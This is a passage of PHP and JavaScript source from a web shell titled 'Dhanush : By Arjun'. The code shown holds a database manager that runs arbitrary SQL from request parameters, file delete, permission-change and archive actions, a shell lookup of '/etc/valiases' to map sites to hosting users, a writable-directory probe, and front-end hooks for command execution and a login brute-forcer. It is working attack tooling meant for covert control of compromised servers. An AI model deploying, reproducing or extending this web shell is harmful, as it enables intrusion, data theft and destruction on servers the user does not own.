				echo "<td>".$field["Key"]."</td>\n";
				echo "<td>".$field["Default"]."</td>\n";
				echo "<td>".$field["Extra"]."</td>\n";
				$fieldname = $field["Field"];
				echo "<td><a href=# onClick=\"viewtables('dropField','$dbname','$tablename','','','','$fieldname')\">Drop</a></td>\n";
				echo "</tr>\n";
			}
			echo "</table>";
			echo "<div><font color=white size=3>[ $dbname ]</font> - <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('viewdb')\"> <font size=3>Database List</font> </a> <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('listTables','$dbname','$tablename')\"> <font size=3>Table List</font> </a> &nbsp; <a href=$self?logoutdb> <font  size=3>[ Log Out ]</font> </a></div>";
		}
		
		// Execute Query
		if($_GET['action'] == "executequery")
		{
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			$result = mysql_query($_GET['executemyquery']); 
			
			//  results 
			echo "<html>\r\n". strtoupper($_GET['executemyquery']) . "<br>\r\n<table border =\"1\">\r\n"; 
			 
			$count = 0; 
			while ($row = mysql_fetch_assoc($result)) 
			{ 
			   echo "<tr>\r\n"; 
			 
			   if ($count==0) // list column names 
			   { 
				  echo "<tr>\r\n"; 
				  while($key = key($row)) 
				  { 
					 echo "<td><b>" . $key . "</b></td>\r\n"; 
					 next($row); 
				  } 
				  echo "</tr>\r\n"; 
			   } 
			 
			   foreach($row as $r) // list content of column names 
			   { 
				  if ($r=='') $r = '<font >NULL</font>'; 
				  echo "<td><font class=txt>" . $r . "</font></td>\r\n"; 
			   } 
			   echo "</tr>\r\n"; 
			   $count++; 
			} 
			echo "</table>\n\r<font class=txt size=3>" . $count . " rows returned.</font>\r\n</html>"; 
			echo "<div><font color=white size=3>[ $dbname ]</font> - <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('viewdb')\"> <font size=3>Database List</font> </a> <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('listTables','$dbname','$tablename')\"> <font size=3>Table List</font> </a> &nbsp; <a href=$self?logoutdb> <font  size=3>[ Log Out ]</font> </a></div>";
		}
		
		// View Table Data
		if($_GET['action'] == "viewdata")
		{
			global $queryStr, $action, $mysqlHandle, $dbname, $tablename, $PHP_SELF, $errMsg, $page, $rowperpage, $orderby, $data;
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			echo "<br><div><font color=white size=3>[ $dbname ]</font> - <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('viewdb')\"> <font size=3>Database List</font> </a> <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('listTables','$dbname','$tablename')\"> <font size=3>Table List</font> </a> &nbsp; <a href=$self?logoutdb> <font  size=3>[ Log Out ]</font> </a></div>";	
			?>
			<br><br>
			<form>
			<table>
				<tr>
					<td><textarea cols="60" rows="7" name="executemyquery" class="box">Execute Query..</textarea></td>
				</tr>
				<tr>
					<td><input type="button" onClick="viewtables('executequery','<?php echo $_GET['dbname'];?>','<?php echo $_GET['tablename']; ?>','','',executemyquery.value)" value="Execute" class="but"></td>
				</tr>
			</table>
			</form>
			<?php 
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			
			$sql = mysql_query("SELECT `COLUMN_NAME` FROM `information_schema`.`COLUMNS` WHERE (`TABLE_SCHEMA` = '$dbname')  AND (`TABLE_NAME` = '$tablename')  AND (`COLUMN_KEY` = 'PRI');");
			$row = mysql_fetch_array($sql);
			$rowid = $row['COLUMN_NAME'];
			
			echo "<br><font size=4 color =lime>Data in Table</font><br>";
			if( $tablename != "" )
				echo "<font size=3 class=txt>$dbname &gt; $tablename</font><br>";
			else
				echo "<font size=3 class=txt>$dbname</font><br>";
			
			$queryStr = "";
			$pag = 0;
			$queryStr = stripslashes( $queryStr );
			if( $queryStr == "" ) 
			{
				if(isset($_REQUEST['page']))
				{
					$res = mysql_query("select * from $tablename");
					$getres = mysql_num_rows($res);
					$coun = ceil($getres/30);
					if($_REQUEST['page'] != 1)

						$pag = $_REQUEST['page'] * 30;
					else
						$pag = $_REQUEST['page'] * 30;
					
					$queryStr = "SELECT * FROM $tablename LIMIT $pag,30";
					$sql = mysql_query("SELECT $rowid FROM $tablename ORDER BY $rowid LIMIT $pag,30");
					$arrcount = 1;
					$arrdata[$arrcount] = 0;
					while($row = mysql_fetch_array($sql))
					{
						$arrdata[$arrcount] = $row[$rowid];
						$arrcount++;
					}
				}
				else
				{
					$queryStr = "SELECT * FROM $tablename LIMIT 0,30";
					$sql = mysql_query("SELECT $rowid FROM $tablename ORDER BY $rowid LIMIT 0,30");
					$arrcount = 1;
					$arrdata[$arrcount] = 0;
					while($row = mysql_fetch_array($sql))
					{
						$arrdata[$arrcount] = $row[$rowid];
						$arrcount++;
					}
				}
				if( $orderby != "" )
					$queryStr .= " ORDER BY $orderby";
				echo "<a href=# onClick=\"viewtables('viewSchema','$dbname','$tablename')\"><font size=3>Schema</font></a>\n";
			}
		

			$pResult = mysql_query($queryStr );
			$fieldt = mysql_fetch_field($pResult);
			$tablename = $fieldt->table;
			$errMsg = mysql_error();
		
			$GLOBALS[queryStr] = $queryStr;
		
			if( $pResult == false ) 
			{
				echoQueryResult();
				return;
			}
			if( $pResult == 1 ) 
			{
				$errMsg = "Success";
				echoQueryResult();
				return;
			}
		
			echo "<hr color='#1B1B1B'>\n";
		
			$row = mysql_num_rows( $pResult );
			$col = mysql_num_fields( $pResult );
		
			if( $row == 0 ) 
			{
				echo "<font  size=3>No Data Exist!</font>";
				return;
			}
		
			if( $rowperpage == "" ) $rowperpage = 30;
			if( $page == "" ) $page = 0;
			else $page--;
			mysql_data_seek( $pResult, $page * $rowperpage );
		
			echo "<table cellspacing=1 cellpadding=5 border=1 align=center>\n";
			echo "<tr>\n";
			for( $i = 0; $i < $col; $i++ ) 
			{
				$field = mysql_fetch_field( $pResult, $i );
				echo "<th>";
				if($action == "viewdata")
					echo "<a href='$PHP_SELF?action=viewdata&dbname=$dbname&tablename=$tablename&orderby=".$field->name."'>".$field->name."</a>\n";
				else
					echo $field->name."\n";
				echo "</th>\n";
			}
			echo "<th colspan=2>Action</th>\n";
			echo "</tr>\n";
			$num=1;
			
			
			$acount = 1;
						
			for( $i = 0; $i < $rowperpage; $i++ ) 
			{
				$rowArray = mysql_fetch_row( $pResult );
				if( $rowArray == false ) break;
				echo "<tr>\n";
				$key = "";
				for( $j = 0; $j < $col; $j++ )
				 {
					$data = $rowArray[$j];
		
					$field = mysql_fetch_field( $pResult, $j );
					if( $field->primary_key == 1 )
						$key .= "&" . $field->name . "=" . $data;
		
					if( strlen( $data ) > 30 )
						$data = substr( $data, 0, 30 ) . "...";
					$data = htmlspecialchars( $data );
					echo "<td>\n";
					echo "<font class=txt>$data</font>\n";
					echo "</td>\n";
				}
			
				if(!is_numeric($arrdata[$acount]))
				echo "<td colspan=2>No Key</td>\n";
				else 
				{
					echo "<td><a href=# onClick=\"viewtables('editData','$dbname','$tablename','$rowid','$arrdata[$acount]')\">Edit</a></td>\n";
					echo "<td><a href=# onClick=\"viewtables('deleteData','$dbname','$tablename','$rowid','$arrdata[$acount]')\">Delete</a></td>\n";
					$acount++;
				}
			}
			echo "</tr>\n";
		
		
			echo "</table>";
			if($arrcount > 30)
			{
				$res = mysql_query("select * from $tablename");
				$getres = mysql_num_rows($res);
				$coun = ceil($getres/30);
				echo "<form action=$self><input type=hidden value=viewdata name=action><input type=hidden name=tablename value=$tablename><input type=hidden value=$dbname name=dbname><select style='width: 95px;' name=page class=sbox>";
				for($i=0;$i<$coun;$i++)
					echo "<option value=$i>$i</option>";
				
				echo "</select> <input type=button onClick=\"viewtables('viewdata','$dbname','$tablename','','','','',page.value)\" value=Go class=but></form>";
				echo "<br><div><font color=white size=3>[ $dbname ]</font> - <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('viewdb')\"> <font size=3>Database List</font> </a> <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('listTables','$dbname','$tablename')\"> <font size=3>Table List</font> </a> &nbsp; <a href=$self?logoutdb> <font  size=3>[ Log Out ]</font> </a></div>";	
			}
		}
		
		// Delete Table Data
		if($_GET['action'] == "deleteData")
		{
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			$sql = mysql_query("SELECT `COLUMN_NAME` FROM `information_schema`.`COLUMNS` WHERE (`TABLE_SCHEMA` = '$dbname')  AND (`TABLE_NAME` = '$tablename')  AND (`COLUMN_KEY` = 'PRI');");
			$row = mysql_fetch_array($sql);
			$row = $row['COLUMN_NAME'];
			$rowid = $_GET[$row];
			mysql_query("delete from $tablename where $row = '$rowid'");
			listtable();
		}
		// Edit Table Data
		if($_GET['action'] == "editData")
		{
			global $queryStr, $action, $mysqlHandle, $dbname, $tablename, $PHP_SELF, $errMsg, $page, $rowperpage, $orderby, $data;
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			echo "<br><div><font color=white size=3>[ $dbname ]</font> - <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('viewdb')\"> <font size=3>Database List</font> </a> <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('listTables','$dbname','$tablename')\"> <font size=3>Table List</font> </a> &nbsp; <a href=$self?logoutdb> <font  size=3>[ Log Out ]</font> </a></div>";	
			?>
			<br><br>
			<form action="<?php echo $self; ?>" method="post">
			<?php 
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			
			$sql = mysql_query("SELECT `COLUMN_NAME` FROM `information_schema`.`COLUMNS` WHERE (`TABLE_SCHEMA` = '$dbname')  AND (`TABLE_NAME` = '$tablename')  AND (`COLUMN_KEY` = 'PRI');");
			$row = mysql_fetch_array($sql);
			$row = $row['COLUMN_NAME'];
			$rowid = $_GET[$row];
						
			$pResult = mysql_list_fields( $dbname, $tablename );
			$num = mysql_num_fields( $pResult );
	
			$key = "";
			for( $i = 0; $i < $num; $i++ ) 
			{
				$field = mysql_fetch_field( $pResult, $i );
				if( $field->primary_key == 1 )
					if( $field->numeric == 1 )
						$key .= $field->name . "=" . $GLOBALS[$field->name] . " AND ";
					else
						$key .= $field->name . "='" . $GLOBALS[$field->name] . "' AND ";
			}
			$key = substr( $key, 0, strlen($key)-4 );
	
			mysql_select_db( $dbname, $mysqlHandle );
			$pResult = mysql_query( $queryStr =  "SELECT * FROM $tablename WHERE $row = $rowid", $mysqlHandle );
			$data = mysql_fetch_array( $pResult );
		
			echo "<table cellspacing=1 cellpadding=2 border=1>\n";
			echo "<tr>\n";
			echo "<th>Name</th>\n";
			echo "<th>Type</th>\n";
			echo "<th>Function</th>\n";
			echo "<th>Data</th>\n";
			echo "</tr>\n";
		
			$pResult = mysql_db_query( $dbname, "SHOW fields FROM $tablename" );
			$num = mysql_num_rows( $pResult );
		
			$pResultLen = mysql_list_fields( $dbname, $tablename );
			$fundata1 = "'action','editsubmitData','dbname','".$dbname."','tablename','".$tablename."',";
			$fundata2 = "'action','insertdata','dbname','".$dbname."','tablename','".$tablename."',";
			for( $i = 0; $i < $num; $i++ ) 
			{
				$field = mysql_fetch_array( $pResult );
				$fieldname = $field["Field"];
				$fieldtype = $field["Type"];
				$len = mysql_field_len( $pResultLen, $i );
		
				echo "<tr>";
				echo "<td>$fieldname</td>";
				echo "<td>".$field["Type"]."</td>";
				echo "<td>\n";
				echo "<select name=${fieldname}_function class=sbox>\n";
				echo "<option>\n";
				echo "<option>ASCII\n";
				echo "<option>CHAR\n";
				echo "<option>SOUNDEX\n";
				echo "<option>CURDATE\n";
				echo "<option>CURTIME\n";
				echo "<option>FROM_DAYS\n";
				echo "<option>FROM_UNIXTIME\n";
				echo "<option>NOW\n";
				echo "<option>PASSWORD\n";
				echo "<option>PERIOD_ADD\n";
				echo "<option>PERIOD_DIFF\n";
				echo "<option>TO_DAYS\n";
				echo "<option>USER\n";
				echo "<option>WEEKDAY\n";
				echo "<option>RAND\n";
				echo "</select>\n";
				echo "</td>\n";
				$value = htmlspecialchars($data[$i]);
				$type = strtok( $fieldtype, " (,)\n" );
				if( $type == "enum" || $type == "set" ) 
				{
					echo "<td>\n";
					if( $type == "enum" )
						echo "<select name=$fieldname class=box>\n";
					else if( $type == "set" )
						echo "<select name=$fieldname size=4 class=box multiple>\n";
					while( $str = strtok( "'" ) ) 
					{
						if( $value == $str )
							echo "<option selected>$str\n";
						else
							echo "<option>$str\n";
						strtok( "'" );
					}
					echo "</select>\n";
					echo "</td>\n";
					} 
					else 
					{
						if( $len < 40 )
							echo "<td><input type=text size=40 maxlength=$len id=dhanush_$fieldname name=sql_$fieldname value=\"$value\" class=box></td>\n";
						else
							echo "<td><textarea cols=47 rows=3 maxlength=$len name=dhanush_$fieldname class=box>$value</textarea>\n";
					}
					$fundata1 .= "'dhanush_".$fieldname."',dhanush_".$fieldname.".value,";
					$fundata2 .= "'dhanush_".$fieldname."',dhanush_".$fieldname.".value,";
				echo "</tr>";
			}
			$fundata1=eregi_replace(',$', '', $fundata1); 
			$fundata2=eregi_replace(',$', '', $fundata2);
			
			echo "</table><p>\n";
			echo "<input type=button onClick=\"editdata($fundata1)\" value='Edit Data' class=but>\n";
			echo "<input type=button value='Insert' onClick=\"editdata($fundata2)\" class=but>\n";
			echo "</form>\n";
		}
	}
// Edit Submit Table Data
else if($_REQUEST['action'] == "editsubmitData")
{
	$dbserver = $_COOKIE["dbserver"];
	$dbuser = $_COOKIE["dbuser"];
	$dbpass = $_COOKIE["dbpass"];
	$dbname = $_POST['dbname'];
	$tablename = $_POST['tablename'];
	
	$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
	mysql_select_db($dbname);
	
	$sql = mysql_query("SELECT `COLUMN_NAME` FROM `information_schema`.`COLUMNS` WHERE (`TABLE_SCHEMA` = '$dbname')  AND (`TABLE_NAME` = '$tablename')  AND (`COLUMN_KEY` = 'PRI');");
	$row = mysql_fetch_array($sql);
	$row = $row['COLUMN_NAME'];
	$rowid = $_POST[$row];
		
	$pResult = mysql_db_query( $dbname, "SHOW fields FROM $tablename" );
	$num = mysql_num_rows( $pResult );
	
	$rowcount = $num;
				
	$pResultLen = mysql_list_fields( $dbname, $tablename );

	for( $i = 0; $i < $num; $i++ ) 
	{
		$field = mysql_fetch_array( $pResult );
		$fieldname = $field["Field"];
		$arrdata = $_REQUEST[$fieldname];
	
		$str .= " " . $fieldname . " = '" . $arrdata . "'";
		$rowcount--;
		if($rowcount != 0)
			$str .= ",";
	}
	
	$str = "update $tablename set" . $str . " where $row=$rowid";
	mysql_query($str);
	?><div id="showsql"></div><?php
}
// Insert Table Data
else if($_REQUEST['action'] == "insertdata")
{
	$dbserver = $_COOKIE["dbserver"];
	$dbuser = $_COOKIE["dbuser"];
	$dbpass = $_COOKIE["dbpass"];
	$dbname = $_POST['dbname'];
	$tablename = $_POST['tablename'];
	
	$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
	mysql_select_db($dbname);
			
	$sql = mysql_query("SELECT `COLUMN_NAME` FROM `information_schema`.`COLUMNS` WHERE (`TABLE_SCHEMA` = '$dbname')  AND (`TABLE_NAME` = '$tablename')  AND (`COLUMN_KEY` = 'PRI');");
	$row = mysql_fetch_array($sql);
	$row = $row['COLUMN_NAME'];
	$rowid = $_POST[$row];
	
	$pResult = mysql_db_query( $dbname, "SHOW fields FROM $tablename" );
	$num = mysql_num_rows( $pResult );
	
	$rowcount = $num;
				
	$pResultLen = mysql_list_fields( $dbname, $tablename );

	for( $i = 0; $i < $num; $i++ ) 
	{
		$field = mysql_fetch_array( $pResult );
		$fieldname = $field["Field"];
		$arrdata = $_REQUEST[$fieldname];
	
		$str1 .= "".$fieldname . ",";
		$str2 .= "'".$arrdata . "',";
		$rowcount--;
		if($rowcount != 0)
		{
			//$str1 .= $fieldname . ",";
			//$str2 .= $arrdata . ",";
		}
	}
	$str1=eregi_replace(',$', '', $str1); 
	$str2=eregi_replace(',$', '', $str2); 
	$str = "INSERT INTO `$tablename` ($str1) VALUES ($str2);";
	mysql_query($str);
	
	?><div id="showsql"></div><?php
}
else if(isset($_GET['logoutdb']))
{
	setcookie("dbserver",time() - 60*60);
	setcookie("dbuser",time() - 60*60);
	setcookie("dbpass",time() - 60*60);
	header("Location:$self");
}
else if(isset($_POST['choice']))
{  
	if($_POST['choice'] == "delete") 
	{
		$actbox = $_POST["actbox"];
				
		foreach ($actbox as $myv) 
		$myv = explode(",",$myv);
		foreach ($myv as $v) 
		{			
			if(is_file($v))
			{
				if(unlink($v))
					echo "<br><center><font class=txt>File $v Deleted Successfully</font></center>";
				else
					echo "<br><center>Cannot Delete File $v</center>";
			}	
			else if(is_dir($v))
			{
				rrmdir($v);
			}
		}
	}
	else if($_POST['choice'] == "chmod")
	{ ?>
		<form id="chform"><?php 
		$actbox1 = $_POST['actbox'];
		foreach ($actbox1 as $myv) 
		$myv = explode(",",$myv);
		foreach ($myv as $v) 
		{ ?>
			<input type="hidden" name="actbox3[]" id="actbox3[]" value="<?php echo $v; ?>">
		<?php }
		?>
			<table align="center" border="3" style="width:40%; border-color:#333333;">
				<tr>
					<td style="height:40px" align="right">Change Permissions </td><td align="center"><input value="0755" name="chmode" class="sbox" /></td> 
				</tr>
				<tr>
					<td colspan="2" align="center" style="height:60px">
			<input type="button" onClick="myaction('changefileperms',chmode.value)" value="Change Permission" class="but" style="padding: 5px;" /></td>
				</tr>
			</table>
			
		</form>  <?php
	}
	else if($_POST['choice'] == "changefileperms")
	{
		if($_POST['chmode'] != null && is_numeric($_POST['chmode']))
		{
			$actbox = $_POST["actbox"];
			foreach ($actbox as $myv) 
			$myv = explode(",",$myv);
			foreach ($myv as $v) 
			{
				if(is_file($v) || is_dir($v))
				{
					$perms = 0; 
					for($i=strlen($_POST['chmode'])-1;$i>=0;--$i) 
						$perms += (int)$_POST['chmode'][$i]*pow(8, (strlen($_POST['chmode'])-$i-1)); 
					echo "<div align=left style=width:60%;>";
					if(@chmod($v,$perms))
						echo "<font class=txt>File $v Permissions Changed Successfully</font><br>";
					else
						echo "Cannot Change $v File Permissions<br>";
					echo "</div>";
				}
			}
				
		}
	}
	else if($_POST['choice'] == "compre") 
	{
		$actbox = $_POST["actbox"];
		foreach ($actbox as $myv) 
			$myv = explode(",",$myv);
		foreach ($myv as $v) 
		{
			if(is_file($v))
			{
				$zip = new ZipArchive();
				$filename= basename($v) . '.zip';
				if(($zip->open($filename, ZipArchive::CREATE))!==true)
				{ echo '<br><font  size=3>Error: Unable to create zip file for $v</font>';}
				else {echo "<br><font class=txt size=3>File $v Compressed successfully</font>";}
				$zip->addFile(basename($v));
				$zip->close();
			}
			else if(is_dir($v))
			{
				if($os == "Linux")
				{
					$filename= basename($v);
					execmd("tar --create --recursion --file=$filename.tar $v");
					echo "<br><font class=txt size=3>File $v Compressed successfully as $v.tar</font>";
				}
			}
		}
	}
	else if($_POST['choice'] == "uncompre") 
	{
		$actbox = $_POST["actbox"];
		foreach ($actbox as $myv) 
		$myv = explode(",",$myv);
		foreach ($myv as $v) 
		{
			 if(is_file($v) || is_dir($v))
			 {
			 $zip = new ZipArchive;
			 $filename= basename($v);
			 $res = $zip->open($filename);
			 if ($res === TRUE) 
			 {
			 	 $pieces = explode(".",$filename);
				 $zip->extractTo($pieces[0]);
				 $zip->close();
				 echo "<br><font class=txt size=3>File $v Unzipped successfully</font>";
			 } else
				 echo "<br><font  size=3>Error: Unable to Unzip file $v</font>";
			 }
		}
	}
}
else if(isset($_GET['sitename']))
{
	$sitename = str_replace("http://","",$_GET['sitename']);
	$sitename = str_replace("http://www.","",$sitename);
	$sitename = str_replace("www.","",$sitename);
	$show = myexe("ls -la /etc/valiases/".$sitename);
	if(!empty($show))
		echo $show;
	else
		echo "Cannot get the username";
}
else if(isset($_GET['mydata']))
{
	listdatabase();
}
else if(isset($_GET['home']))
{
	mainfun($_GET['home']);
}
else if(isset($_GET['dir']))
{
	mainfun($_GET['myfilepath']);
}
else if(isset($_GET['mydirpath']))
{
	echo is_writable($_GET['mydirpath'])?"<font class=txt>&lt; writable &gt;</font>":"&lt; not writable &gt;";
}
else
{
?>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/> 
<title>Dhanush : By Arjun</title>
<script type="text/javascript">
checked = false;
var waitstate = "<center><marquee scrollamount=4 width=150>Wait....</marquee></center>";
function checkedAll () 
{
    if (checked == false){checked = true}else{checked = false}
	for (var i = 0; i < document.getElementById('myform').elements.length; i++) 
	{
	  document.getElementById('myform').elements[i].checked = checked;
	}
}
function urlchange(myfilepath)
{
	var mypath, mpath, i, t, j, r = "",myurl = "",splitter="";
	splitter = "<?php echo addslashes($directorysperator); ?>";
	mypath = mpath = myfilepath.split(splitter);
	<?php if($os == "Linux") { ?>
			r = "/";
			myurl = "<a href=javascript:void(0) onClick=\"changedir('dir','/')\">/</a>";
	<?php } ?>
	for (i = 0; i < mypath.length; i++) 
	{
		if(mypath[i] == "")
			continue;
   		r += mypath[i]+"<?php echo addslashes($directorysperator); ?>";
		
		myurl += "<a href=javascript:void(0) onClick=\"changedir('dir','"+r+"\')\"><b>"+mypath[i]+"<?php echo addslashes($directorysperator); ?></b></a>";
	}
	myurl = myurl.replace(/\\/g,"\\\\");
	return myurl;
}
function wrtblDIR(mydirpath)
{
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			for(i=0;i<=3;i++)
				document.getElementsByName("wrtble")[i].innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?&mydirpath="+mydirpath, true);
	ajaxRequest.send(null); 
}
function setpath(myfilpath)
{
	wrtblDIR(myfilpath);
	document.getElementById("path").value=myfilpath;
	document.getElementById("createfile").value=myfilpath;
	document.getElementById("createfolder").value=myfilpath;
	document.getElementById("createfolder").value=myfilpath;
	document.getElementById("exepath").value=myfilpath;
	document.getElementById("auexepath").value=myfilpath;
	document.getElementById("showdir").innerHTML="";
}
function changedir(myaction,myfilepath)
{
	var myurl = urlchange(myfilepath);
	
	document.getElementById("showmaindata").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			setpath(myfilepath);
			document.getElementById("crdir").innerHTML=myurl;
			document.getElementById("showmaindata").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?"+myaction+"&myfilepath="+myfilepath, true);
	ajaxRequest.send(null); 
}
function gethome(myaction,mydir)
{
	var myurl = urlchange(mydir);
	document.getElementById("showmaindata").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showmaindata").innerHTML=ajaxRequest.responseText;
			setpath(mydir);
			document.getElementById("crdir").innerHTML=myurl;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?"+myaction+"="+mydir, true);
	ajaxRequest.send(null); 
}
function getname(sitename)
{
	document.getElementById("showsite").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
				document.getElementById("showsite").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?sitename="+sitename, true);
	ajaxRequest.send(null); 
}
function myaction(myfileaction,chmode)
{
	var mytype = document.getElementsByName('actbox[]');
	var mychoice = new Array();
	
	for (var i = 0, length = mytype.length; i < length; i++)
	{
		if (mytype[i].checked)
			mychoice[i] = mytype[i].value;
	}
	
	var params = "choice="+myfileaction+"&chmode="+chmode+"&actbox[]="+mychoice;

	document.getElementById("showdir").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showdir").innerHTML=ajaxRequest.responseText;
		}
	}
	
	ajaxRequest.open("POST", "<?php echo $_SERVER["PHP_SELF"]; ?>", true);
	ajaxRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
	ajaxRequest.send(params);
}
function editdata()
{
	var result = "", // initialize list
       i,dbname,tablename;
   // iterate through arguments
   for (i = 1; i < arguments.length; i++)
   {
   	  if(i%2 == 0)
      	result += arguments[i]+'=';
	  else
	  	result += arguments[i]+'&';
   }
   result = result.slice(0, -1);
	
	dbname = arguments[3];
	tablename = arguments[5];
	var result=result.replace(/dhanush_/g,""); 
	var params = arguments[0]+"="+result;

	document.getElementById("showsql").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			viewtables('listTables',dbname,tablename);
		}
	}
	
	ajaxRequest.open("POST", "<?php echo $_SERVER["PHP_SELF"]; ?>", true);
	ajaxRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
	ajaxRequest.send(params);
}
function viewtables(action,dbname,tablename,rowid,arrdata,executequery,fieldname,page)
{
	document.getElementById("showsql").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
				document.getElementById("showsql").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?action="+action+"&dbname="+dbname+"&tablename="+tablename+"&"+rowid+"="+arrdata+"&executemyquery="+executequery+"&fieldname="+fieldname+"&page="+page, true);
	ajaxRequest.send(null); 
}
function mydatabase(server,username,password)
{
	document.getElementById("showsql").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			mydatago();
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?executeit&server="+server+"&username="+username+"&password="+password, true);
	ajaxRequest.send(null); 
}
function mydatago()
{
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("datatable").style.display = 'none';
			document.getElementById("showsql").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?mydata", true);
	ajaxRequest.send(null); 
}
function bruteforce(prototype,serverport,login,dict)
{
	var mytype = document.getElementsByName('mytype');
	for (var i = 0, length = mytype.length; i < length; i++)
	{
		if (mytype[i].checked)
			break;
	}
	var getreverse = 0;
	if(document.getElementById('reverse').checked == true)
		getreverse = 1;
	else
		getreverse = 0;
	
	document.getElementById("showbrute").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showbrute").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?prototype="+prototype+"&serverport="+serverport+"&login="+login+"&dict="+dict+"&type="+mytype[i].value+"&reverse="+getreverse, true);
	ajaxRequest.send(null); 
}
function executemyfile(action,executepath,execute)
{
	document.getElementById("showmaindata").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showmaindata").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?"+action+"&executepath="+executepath+"&execute="+execute, true);
	ajaxRequest.send(null); 
}
function maindata(myaction,dir)
{
	document.getElementById("showmaindata").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showmaindata").innerHTML=ajaxRequest.responseText;
			document.getElementById("showdir").innerHTML="";
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?"+myaction+"="+myaction+"&dir="+dir, true);
	ajaxRequest.send(null); 
}
function manuallyscriptfn(passwd)
{
	var message = encodeURIComponent(passwd);
	var params = "scriptlocator=scriptlocator&passwd="+passwd;
	document.getElementById("showdata").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showdata").innerHTML=ajaxRequest.responseText;
